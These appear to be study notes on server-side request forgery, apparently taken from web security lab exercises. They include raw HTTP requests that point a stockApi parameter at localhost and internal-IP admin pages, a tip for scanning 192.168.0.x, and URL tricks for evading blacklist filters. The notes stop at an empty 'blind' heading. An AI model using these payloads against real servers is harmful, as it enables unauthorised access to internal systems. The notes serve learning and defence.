# SSRF attacks against the server itself
In contast to the CSRF we access the some pages of the internal website bypassing client side
Example: 

* Usually we get the stockAPI in body, but we just might change this to an admin url

POST /product/stock HTTP/1.1
Host: ac1d1f9e1f0e1ac480111d2a008800cd.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac1d1f9e1f0e1ac480111d2a008800cd.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://ac1d1f9e1f0e1ac480111d2a008800cd.web-security-academy.net
Content-Length: 107
Connection: close
Cookie: session=9mPUQjbu8oDIWg9Hxexc9mPvamTZfsDG

stockApi=http://localhost/admin

# SSRF attacks against other back-end systems
where the application server is able to interact with other back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses

Example: 
* administrative interface at the back-end URL https://192.168.0.68/admin

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin 

* to find out the IP you might interate 192.168.0.x

# SSRF with blacklist-based input filters

* You can embed credentials in a URL before the hostname, using the @ character. For example: https://expected-host@evil-host.
* You can use the # character to indicate a URL fragment. For example: https://evil-host#expected-host.
* You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: https://expected-host.evil-host.
* You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. 

# blind
